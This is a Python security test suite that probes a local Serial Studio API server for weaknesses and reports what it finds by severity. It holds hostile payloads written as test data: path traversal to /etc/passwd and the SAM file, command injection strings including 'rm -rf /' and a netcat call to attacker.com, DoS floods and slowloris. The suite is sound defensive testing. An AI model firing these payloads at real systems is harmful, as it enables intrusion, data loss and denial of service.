#!/usr/bin/env python3
"""
API Security Testing Suite for Serial Studio

This test suite attempts to exploit vulnerabilities in the Serial Studio API
to verify security hardening and identify potential attack vectors.

Attack categories:
- Input validation bypass
- JSON parsing exploits
- Buffer overflow/exhaustion
- Command injection
- Path traversal
- DoS attacks
- Resource exhaustion

Copyright (C) 2020-2025 Alex Spataru
SPDX-License-Identifier: GPL-3.0-only OR LicenseRef-SerialStudio-Commercial
"""

import json
import socket
import time
import uuid
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.api_client import SerialStudioClient, APIError


class SecurityTester:
    """Base class for security testing"""

    def __init__(self, host="127.0.0.1", port=7777):
        self.host = host
        self.port = port
        self.vulnerabilities = []

    def log_vulnerability(self, severity, category, description, payload=None):
        """Log a discovered vulnerability"""
        vuln = {
            "severity": severity,  # CRITICAL, HIGH, MEDIUM, LOW, INFO
            "category": category,
            "description": description,
            "payload": payload,
        }
        self.vulnerabilities.append(vuln)
        print(f"[{severity}] {category}: {description}")
        if payload:
            print(f"  Payload: {repr(payload)[:200]}")

    def report(self):
        """Generate vulnerability report"""
        print("\n" + "=" * 80)
        print("SECURITY TEST REPORT")
        print("=" * 80)
        print(f"Total issues found: {len(self.vulnerabilities)}")

        by_severity = {}
        for vuln in self.vulnerabilities:
            sev = vuln["severity"]
            by_severity[sev] = by_severity.get(sev, 0) + 1

        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = by_severity.get(severity, 0)
            if count > 0:
                print(f"  {severity}: {count}")

        print("\nDetailed findings:")
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{i}. [{vuln['severity']}] {vuln['category']}")
            print(f"   {vuln['description']}")


def test_json_parsing_exploits(tester):
    """Test JSON parsing vulnerabilities"""
    print("\n[*] Testing JSON parsing exploits...")

    with SerialStudioClient() as client:
        # Test 1: Deeply nested JSON (potential stack overflow)
        print("  - Testing deeply nested JSON (10000 levels)...")
        nested = "{" * 10000 + "}" * 10000
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((tester.host, tester.port))
            sock.sendall(nested.encode() + b"\n")
            sock.settimeout(2.0)
            response = sock.recv(65536)
            sock.close()

            # If server doesn't crash, check response
            if b"error" not in response.lower():
                tester.log_vulnerability(
                    "HIGH",
                    "JSON Parsing",
                    "Server accepts deeply nested JSON without depth limit",
                    nested[:100],
                )
        except (socket.timeout, ConnectionError):
            print("    Server closed connection (GOOD)")

        # Test 2: Extremely large JSON object
        print("  - Testing oversized JSON object (100MB)...")
        large_obj = {
            "type": "command",
            "id": str(uuid.uuid4()),
            "command": "api.getCommands",
            "params": {"x" * 1000: "y" * 1000000},  # 1MB+ parameter
        }
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((tester.host, tester.port))
            sock.sendall(json.dumps(large_obj).encode() + b"\n")
            sock.settimeout(2.0)
            response = sock.recv(65536)
            sock.close()
            tester.log_vulnerability(
                "MEDIUM",
                "JSON Parsing",
                "Server accepts extremely large JSON payloads (100MB+)",
                f"{len(json.dumps(large_obj))} bytes",
            )
        except (socket.timeout, ConnectionError, MemoryError):
            print("    Server rejected or closed connection (GOOD)")

        # Test 3: Malformed JSON with control characters
        print("  - Testing malformed JSON with control characters...")
        malformed_payloads = [
            b'{"type":"command\x00\x01\x02","command":"test"}',  # NULL bytes
            b'{"type":"command\r\n","id":"\x1b[31mINJECTED\x1b[0m"}',  # ANSI escape
            b'{"type":"command","id":"' + b"\xff\xfe" + b'"}',  # Invalid UTF-8
        ]

        for payload in malformed_payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((tester.host, tester.port))
                sock.sendall(payload + b"\n")
                sock.settimeout(1.0)
                response = sock.recv(4096)
                sock.close()

                if b"error" not in response.lower() and len(response) > 0:
                    tester.log_vulnerability(
                        "MEDIUM",
                        "Input Validation",
                        "Server processes JSON with control characters",
                        payload,
                    )
            except (socket.timeout, ConnectionError, UnicodeDecodeError):
                pass

        # Test 4: Unicode normalization attack
        print("  - Testing Unicode normalization attacks...")
        unicode_attacks = [
            "api\u200b.getCommands",  # Zero-width space
            "api\u202egetCommands",  # Right-to-left override
            "api\ufeffgetCommands",  # Zero-width no-break space
        ]

        for cmd in unicode_attacks:
            try:
                result = client.command(cmd)
                tester.log_vulnerability(
                    "LOW",
                    "Unicode Handling",
                    f"Command accepted with Unicode control chars: {repr(cmd)}",
                    cmd,
                )
            except APIError:
                pass


def test_command_injection(tester):
    """Test command injection vulnerabilities"""
    print("\n[*] Testing command injection attacks...")

    with SerialStudioClient() as client:
        # Test 1: Path traversal in file operations
        print("  - Testing path traversal in project.file.open...")
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\localhost\\c$\\windows\\system32\\config\\sam",
        ]

        for payload in path_traversal_payloads:
            try:
                client.command("project.file.open", {"filePath": payload})
                tester.log_vulnerability(
                    "CRITICAL",
                    "Path Traversal",
                    f"Server attempted to open file outside project dir: {payload}",
                    payload,
                )
            except APIError as e:
                # Expected to fail, check error message doesn't leak info
                if "permission" in e.message.lower() or "access" in e.message.lower():
                    print(f"    GOOD: Blocked with error: {e.message}")

        # Test 2: Command injection via parameters
        print("  - Testing command injection in string parameters...")
        injection_payloads = [
            "; rm -rf /",
            "| nc attacker.com 4444",
            "$(whoami)",
            "`id`",
            "${USER}",
            "'; DROP TABLE datasets; --",
        ]

        for payload in injection_payloads:
            try:
                # Try injecting into various commands
                client.command("project.setTitle", {"title": payload})
                client.command(
                    "io.driver.network.setRemoteAddress", {"address": payload}
                )
            except APIError:
                pass  # Expected to fail

        # Test 3: Format string injection
        print("  - Testing format string injection...")
        format_payloads = ["%s%s%s%s%s", "%x%x%x%x", "%n%n%n"]

        for payload in format_payloads:
            try:
                result = client.command("project.setTitle", {"title": payload})
                # Check if response leaks memory addresses
                response_str = json.dumps(result)
                if "0x" in response_str or any(
                    c in response_str for c in ["\x00", "\xff"]
                ):
                    tester.log_vulnerability(
                        "HIGH",
                        "Format String",
                        "Format string vulnerability may exist",
                        payload,
                    )
            except APIError:
                pass


def test_buffer_exhaustion(tester):
    """Test buffer overflow and exhaustion attacks"""
    print("\n[*] Testing buffer exhaustion attacks...")

    # Test 1: Send data without newlines to exhaust line buffer
    print("  - Testing line buffer exhaustion (no newlines)...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tester.host, tester.port))

        # Send 100MB without newline
        chunk = b"A" * (1024 * 1024)  # 1MB chunks
        for i in range(100):
            sock.sendall(chunk)
            time.sleep(0.01)

        # Check if server is still responsive
        sock.sendall(b'{"type":"command","id":"test","command":"api.getCommands"}\n')
        sock.settimeout(2.0)
        response = sock.recv(4096)
        sock.close()

        if response:
            tester.log_vulnerability(
                "HIGH",
                "Buffer Exhaustion",
                "Server buffered 100MB without newline, potential memory exhaustion",
                "100MB of 'A' chars",
            )
    except (socket.timeout, ConnectionError):
        print("    Server closed connection (GOOD)")

    # Test 2: Rapid small messages
    print("  - Testing rapid message flood (1000 msgs/sec)...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tester.host, tester.port))

        start = time.time()
        for i in range(1000):
            msg = {
                "type": "command",
                "id": f"flood-{i}",
                "command": "api.getCommands",
            }
            sock.sendall(json.dumps(msg).encode() + b"\n")

        elapsed = time.time() - start
        rate = 1000 / elapsed

        sock.close()
        print(f"    Sent 1000 messages in {elapsed:.2f}s ({rate:.0f} msg/s)")

        if elapsed < 5.0:
            tester.log_vulnerability(
                "MEDIUM",
                "Rate Limiting",
                f"No rate limiting detected: {rate:.0f} msg/s sustained",
                f"{rate:.0f} msg/s",
            )
    except (socket.timeout, ConnectionError):
        print("    Connection terminated (possible rate limiting)")


def test_batch_abuse(tester):
    """Test batch command abuse"""
    print("\n[*] Testing batch command abuse...")

    with SerialStudioClient() as client:
        # Test 1: Huge batch request
        print("  - Testing oversized batch (10000 commands)...")
        huge_batch = [{"command": "api.getCommands"} for _ in range(10000)]

        try:
            start = time.time()
            results = client.batch(huge_batch, timeout=30.0)
            elapsed = time.time() - start

            # Check if server rejected the batch (error dict returned)
            if isinstance(results, dict) and results.get("error"):
                print(f"    Server rejected batch: {results.get('message')} (GOOD)")
            elif isinstance(results, list) and len(results) > 0:
                tester.log_vulnerability(
                    "MEDIUM",
                    "Batch Processing",
                    f"Server processed {len(results)} commands in {elapsed:.2f}s without limit",
                    f"{len(huge_batch)} commands",
                )
            else:
                print("    Server rejected batch (GOOD)")
        except (APIError, TimeoutError) as e:
            print(f"    Server rejected or timed out: {e} (GOOD)")

        # Test 2: Nested batch requests (if possible)
        print("  - Testing recursive batch commands...")
        try:
            # Try to create recursive structure
            recursive_batch = [
                {
                    "command": "project.loadFromJSON",
                    "params": {"config": {"title": f"Level-{i}"}},
                }
                for i in range(100)
            ]
            results = client.batch(recursive_batch)
            print(f"    Processed {len(results)} nested commands")
        except (APIError, TimeoutError):
            print("    Rejected (GOOD)")


def test_connection_exhaustion(tester):
    """Test connection exhaustion / resource starvation"""
    print("\n[*] Testing connection exhaustion...")

    # Test 1: Open many simultaneous connections
    print("  - Testing connection limit (100 simultaneous)...")
    sockets = []
    try:
        for i in range(100):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((tester.host, tester.port))
            sockets.append(sock)

        print(f"    Opened {len(sockets)} connections successfully")

        if len(sockets) > 50:
            tester.log_vulnerability(
                "LOW",
                "Connection Limit",
                f"No connection limit: opened {len(sockets)} simultaneous connections",
                f"{len(sockets)} connections",
            )

    except (socket.timeout, ConnectionError, OSError) as e:
        print(f"    Connection limit reached at {len(sockets)} connections")
    finally:
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    # Test 2: Slowloris attack (slow header sending)
    print("  - Testing slowloris attack...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tester.host, tester.port))

        # Send JSON one byte at a time with delays
        payload = b'{"type":"command","id":"slow","command":"api.getCommands"}\n'
        for byte in payload:
            sock.send(bytes([byte]))
            time.sleep(0.1)  # 10 bytes/sec

        sock.settimeout(2.0)
        response = sock.recv(4096)
        sock.close()

        if response:
            tester.log_vulnerability(
                "MEDIUM",
                "Slowloris",
                "Server accepts very slow data transmission (10 bytes/sec)",
                "Slowloris timing attack",
            )
    except (socket.timeout, ConnectionError):
        print("    Connection timed out (GOOD)")


def test_raw_data_injection(tester):
    """Test raw data injection attacks"""
    print("\n[*] Testing raw data injection...")

    with SerialStudioClient() as client:
        # First, ensure we're connected to a device
        try:
            client.configure_network(host="127.0.0.1", port=9999, socket_type="tcp")
        except:
            pass

        # Test 1: Inject malicious base64 data
        print("  - Testing malicious base64 payloads...")
        malicious_payloads = [
            b"\x00" * 10000,  # NULL bytes
            b"\xff" * 10000,  # Max bytes
            b"\x00\x01\x02\x03" * 2500,  # Binary data
            b";" * 10000,  # Delimiter injection
            b"\r\n" * 5000,  # Line feed injection
        ]

        for payload in malicious_payloads:
            import base64

            encoded = base64.b64encode(payload).decode()
            try:
                # Try to send raw data through API
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((tester.host, tester.port))

                msg = {
                    "type": "raw",
                    "id": str(uuid.uuid4()),
                    "data": encoded,
                }
                sock.sendall(json.dumps(msg).encode() + b"\n")
                sock.settimeout(1.0)
                response = sock.recv(4096)
                sock.close()

                if b"success" in response:
                    print(f"    Server accepted {len(payload)} byte payload")
            except (socket.timeout, ConnectionError):
                pass


def test_parameter_validation(tester):
    """Test parameter validation bypass"""
    print("\n[*] Testing parameter validation...")

    with SerialStudioClient() as client:
        # Test 1: Type confusion attacks
        print("  - Testing type confusion...")
        type_confusion = [
            {"command": "dashboard.setFPS", "params": {"fps": "not_a_number"}},
            {"command": "dashboard.setFPS", "params": {"fps": -1}},
            {"command": "dashboard.setFPS", "params": {"fps": 999999}},
            {"command": "dashboard.setPoints", "params": {"points": [1, 2, 3]}},
            {"command": "project.setTitle", "params": {"title": 12345}},
            {"command": "project.setTitle", "params": {"title": None}},
            {"command": "project.setTitle", "params": {"title": {"nested": "obj"}}},
        ]

        for test_case in type_confusion:
            try:
                result = client.command(test_case["command"], test_case["params"])
                tester.log_vulnerability(
                    "LOW",
                    "Type Validation",
                    f"Command {test_case['command']} accepted wrong type: {test_case['params']}",
                    test_case,
                )
            except APIError as e:
                # Good - validation working
                pass

        # Test 2: Missing required parameters
        print("  - Testing missing parameter handling...")
        try:
            # Command that requires params
            result = client.command("dashboard.setFPS", {})
            tester.log_vulnerability(
                "LOW",
                "Parameter Validation",
                "Command accepted empty params object",
                {},
            )
        except APIError:
            pass

        # Test 3: Extra unexpected parameters
        print("  - Testing unexpected parameter injection...")
        try:
            result = client.command(
                "api.getCommands",
                {
                    "unexpected": "parameter",
                    "admin": True,
                    "bypass": True,
                    "exec": "malicious",
                },
            )
            # Check if extra params are silently ignored or cause issues
            print("    Server ignored extra parameters (acceptable)")
        except APIError:
            pass


def test_information_disclosure(tester):
    """Test information disclosure vulnerabilities"""
    print("\n[*] Testing information disclosure...")

    with SerialStudioClient() as client:
        # Test 1: Error message information leakage
        print("  - Testing error message information leakage...")
        try:
            client.command("nonexistent.command.path")
        except APIError as e:
            # Check if error reveals internal paths, versions, etc.
            if any(
                keyword in e.message.lower()
                for keyword in [
                    "/home",
                    "/users",
                    "c:\\",
                    "version",
                    "stack",
                    "trace",
                ]
            ):
                tester.log_vulnerability(
                    "LOW", "Information Disclosure", f"Error message leaks info: {e.message}", e.message
                )

        # Test 2: Status commands revealing sensitive info
        print("  - Testing status information disclosure...")
        try:
            commands_list = client.get_available_commands()
            print(f"    Retrieved {len(commands_list)} commands via API")

            # Check for potentially dangerous commands
            dangerous_patterns = [
                "exec",
                "shell",
                "system",
                "eval",
                "delete",
                "remove",
                "kill",
            ]
            for cmd_info in commands_list:
                cmd_name = cmd_info.get("name", "")
                for pattern in dangerous_patterns:
                    if pattern in cmd_name.lower():
                        tester.log_vulnerability(
                            "INFO",
                            "API Design",
                            f"Potentially dangerous command exposed: {cmd_name}",
                            cmd_name,
                        )
        except APIError:
            pass


def test_state_manipulation(tester):
    """Test state manipulation attacks"""
    print("\n[*] Testing state manipulation...")

    with SerialStudioClient() as client:
        # Test 1: Race conditions
        print("  - Testing race conditions in rapid state changes...")
        import threading

        def rapid_state_change():
            try:
                for i in range(100):
                    client.command("io.manager.connect")
                    client.command("io.manager.disconnect")
            except:
                pass

        threads = [threading.Thread(target=rapid_state_change) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        print("    Race condition test completed")

        # Test 2: Invalid state transitions
        print("  - Testing invalid state transitions...")
        try:
            # Try to disconnect before connecting
            client.command("io.manager.disconnect")

            # Try to enable export before configuration
            client.command("csv.export.setEnabled", {"enabled": True})

            print("    Server allowed invalid state transitions")
        except APIError:
            print("    Server validates state transitions (GOOD)")


def main():
    """Run all security tests"""
    print("=" * 80)
    print("Serial Studio API Security Test Suite")
    print("=" * 80)
    print("\nWARNING: This will attempt to exploit the Serial Studio API.")
    print("Only run this against a test instance!")
    print()

    tester = SecurityTester()

    try:
        # Check if server is running
        with SerialStudioClient() as client:
            print("[+] Connected to Serial Studio API\n")

        # Run all attack categories
        test_json_parsing_exploits(tester)
        test_command_injection(tester)
        test_buffer_exhaustion(tester)
        test_batch_abuse(tester)
        test_connection_exhaustion(tester)
        test_raw_data_injection(tester)
        test_parameter_validation(tester)
        test_information_disclosure(tester)
        test_state_manipulation(tester)

    except ConnectionError as e:
        print(f"[ERROR] Cannot connect to Serial Studio API: {e}")
        print("Make sure Serial Studio is running with API Server enabled.")
        return 1

    except KeyboardInterrupt:
        print("\n\n[!] Tests interrupted by user")

    finally:
        # Generate report
        tester.report()

    return 0


if __name__ == "__main__":
    exit(main())
